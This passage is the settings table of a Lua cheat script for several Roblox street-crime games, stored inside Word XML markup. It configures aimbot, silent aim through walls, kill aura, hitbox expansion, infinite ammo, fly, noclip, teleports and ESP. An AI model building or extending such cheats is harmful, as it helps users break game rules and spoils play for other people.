    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["MarshmallowIncrement"] = 5;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        };</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["OwnedBike"] = "Unknown";</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["Guns"] = {};</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["Selected_Item"] = "...";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["Item_Amount"] = 1;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["Locations"] = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["Main Gun Store 🔫"] = CFrame.new(219, 6, -158);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["Black Market 💹"] = CFrame.new(671, 6, 251);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["DealerShip 🚗"] = CFrame.new(738, 6, 439);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["DealerShip Apartments 🌇"] = CFrame.new(717, 5, 548);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["Clothes Store 👕"] = CFrame.new(-197, 6, -74);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["Box Job Apartments 📦"] = CFrame.new(-527, 6, 142);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["Bank 💳"] = CFrame.new(-47, 6, -340);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["Fake ID Seller 🎫"] = CFrame.new(219, 6, -331);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["DOA Turf 🔴"] = CFrame.new(-335, 6, -415);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["OGZ Turf 🟣"] = CFrame.new(125, 6, -466);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["YGZ Turf 🟢"] = CFrame.new(3, 6, 223);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["Studio 🎙"] = CFrame.new(522, 6, -26);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["Shoe Store 👟"] = CFrame.new(525, 7, -184);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["Second Gun Store 🔫"] = CFrame.new(-459, 6, 328);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["Exclusive Gun Store 🔫"] = CFrame.new(1131, 4, 173);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        };</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["Selected_Location"] = "...";</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["Modifications"] = newproxy(true);</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["_Modifications"] = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["DisableJamming"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["ModifySpreadValue"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["ModifyRecoilValue"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["Automatic"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["ModifyFireRate"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["InstantKill"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["ModifyReloadSpeed"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["ModifyEquipSpeed"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["InfiniteAmmo"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["InfiniteClips"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["FireRateSpeed"] = 50;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["SpreadPercentage"] = 50;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["RecoilPercentage"] = 50;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["ReloadSpeed"] = 50;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["EquipSpeed"] = 50;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        };</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["PlayerUtilities"] = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["SelectedPlayer"] = "...";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["BringingPlayer"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["SpectatePlayer"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        };</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["VehicleModifications"] = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["SpeedEnabled"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["SpeedValue"] = 10/1000;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["BreakEnabled"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["BreakValue"] = 50/1000;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["InstantStop"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["InstantStopBind"] = Enum.KeyCode.V;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        };</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["KillAura"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["KillAuraRange"] = 100;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["KillAuraWhitelist"] = {};</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    };</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    ["Game"] = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["Ray_Systems"] = (Game_Name == "Road To Riches" and {"Raycast"} or Game_Name == "BlockSpin" and {"Raycast"} or Game_Name == "Town" and {"Raycast"} or Game_Name == "Universal" and {"Raycast","FindPartOnRay","FindPartOnRayWithWhitelist"} or Game_Name == "The Bronx" and {"FindPartOnRay"}  or Game_Name == "South Bronx" and {"Raycast"} or Game_Name == "Street Life" and {"Raycast"} or Game_Name == "Criminality" and {"Raycast"}) or {};</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["Wall_Bang_Possible"] = ((Game_Name == "Universal" or Game_Name == "Criminality" or Game_Name == "South Bronx" or Game_Name == "The Bronx" or Game_Name == "Street Life"));</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    };</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    ["Aimlock"] = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["Enabled"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["Aiming"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["TargetPart"] = "Head";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["MaxDistance"] = 300;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["Mode"] = "Toggle"; </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["Type"] = "Mouse"; </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["Keybind"] = nil;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["WallCheck"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["Priority"] = {};</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["Whitelisted"] = {};</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["DrawFieldOfView"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["UseFieldOfView"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["Radius"] = 100;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["FieldOfViewColor"] = Color3.new(1,1,1);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["FieldOfViewTransparency"] = 0.25;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["Sides"] = 100;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["Smoothness"] = 1;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["Snapline"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["SnaplineColor"] = Color3.new(1,1,1);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["SnaplineThickness"] = 1;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    };</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    ["Silent"] = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["Enabled"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["Targetting"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["TargetPart"] = {"Head"};</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["Mode"] = "nil";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["MaxDistance"] = 300;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["Keybind"] = nil;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["WallCheck"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["WallBang"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["Priority"] = {};</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["Whitelisted"] = {};</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["DrawFieldOfView"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["UseFieldOfView"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["Radius"] = 100;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["FieldOfViewColor"] = Color3.new(1,1,1);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["FieldOfViewTransparency"] = 0.25;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["Sides"] = 100;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["HitChance"] = 100;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["Snapline"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["SnaplineColor"] = Color3.new(1,1,1);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["Damage"] = 100;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["SnaplineThickness"] = 1;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    };</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    ["WorldVisuals"] = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["SaturationEnabled"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["Saturation_Value"] = 1;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["FogColorEnabled"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["FogColor"] = Color3.new(1,1,1);</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["AmbientEnabled"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["AmbientColor"] = Color3.new(1,1,1);</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["FieldOfViewEnabled"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["FieldOfViewValue"] = 70;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["Fullbright"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    };</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    ["MiscSettings"] = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["Hitbox_Expander"] = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["Enabled"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["Multiplier"] = 15;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["Color"] = Color3.new(1,1,1);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["Transparency"] = 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["Type"] = "Block";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["Material"] = "ForceField";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["Whitelist"] = {};</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["Part"] = "HumanoidRootPart";</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        };</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["ModifySpeed"] = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["Enabled"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["Value"] = 16;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        };</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["ModifyJump"] = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["Enabled"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["Infinity"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["Value"] = 50;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        };</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["Fly"] = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["Enabled"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["Speed"] = 50;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        };</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["SpinBot"] = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["Enabled"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            ["Speed"] = 35;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        };</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        ["No-Clip"] = false;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    };</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    ["Guns"] = {};</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    ESP = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Enabled = false,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        TeamCheck = false,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        MaxDistance = 500,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        FontSize = 12,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Font = Enum.Font.Code,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        FadeOut = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            OnDistance = false,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            OnDeath = true,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            OnLeave = false,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        },</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Options = { </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Teamcheck = true, TeamcheckRGB = Color3.fromRGB(0, 255, 0),</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Friendcheck = true, FriendcheckRGB = Color3.fromRGB(0, 255, 0),</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Highlight = false, HighlightRGB = Color3.fromRGB(255, 0, 0),</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        },</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">        Drawing = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Chams = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Enabled  = false,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Thermal = true,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                FillRGB = Color3.fromRGB(119, 120, 255),</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Fill_Transparency = 80,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                OutlineRGB = Color3.fromRGB(0,0,0),</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Outline_Transparency = 80,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                VisibleCheck = false,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            },</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Names = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Enabled = false,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Transparency = 0,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                RGB = Color3.fromRGB(255, 255, 255),</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            },</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Flags = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Enabled = false,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            },</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Distances = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Enabled = false, </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Position = "Bottom",</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Transparency = 0,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                RGB = Color3.fromRGB(255, 255, 255),</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            },</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Weapons = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Enabled = false, WeaponTextRGB = Color3.fromRGB(119, 120, 255),</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Outlined = false,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Gradient = false,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Transparency = 0,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                GradientRGB1 = Color3.fromRGB(255, 255, 255), GradientRGB2 = Color3.fromRGB(119, 120, 255),</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            },</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Inventory = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Enabled = false, RGB = Color3.fromRGB(255, 255, 255),</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Transparency = 0,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            },</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Healthbar = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Enabled = false,  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                HealthText = false, Lerp = true, HealthTextRGB = Color3.fromRGB(0, 255, 0),</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Width = 2.5,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Transparency = 0,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                HealthTextTransparency = 0,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Gradient = true, GradientRGB1 = Color3.fromRGB(255, 0, 0), GradientRGB2 = Color3.fromRGB(0,255,0)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            },</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            Boxes = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Animate = true,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                RotationSpeed = 300,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Gradient = false, GradientRGB1 = Color3.fromRGB(119, 120, 255), GradientRGB2 = Color3.fromRGB(0, 0, 0), </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                GradientFill = true, GradientFillRGB1 = Color3.fromRGB(119, 120, 255), GradientFillRGB2 = Color3.fromRGB(0, 0, 0), </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Filled = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Enabled = false,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Transparency = 0.75,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    RGB = Color3.fromRGB(0, 0, 0),</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                },</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Full = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Enabled = true,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Transparency = 0,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    RGB = Color3.fromRGB(255, 255, 255),</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                },</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Bounding = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Enabled = false,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Transparency = 0,</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    RGB = Color3.fromRGB(255, 255, 255),</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                },</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                Corner = {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
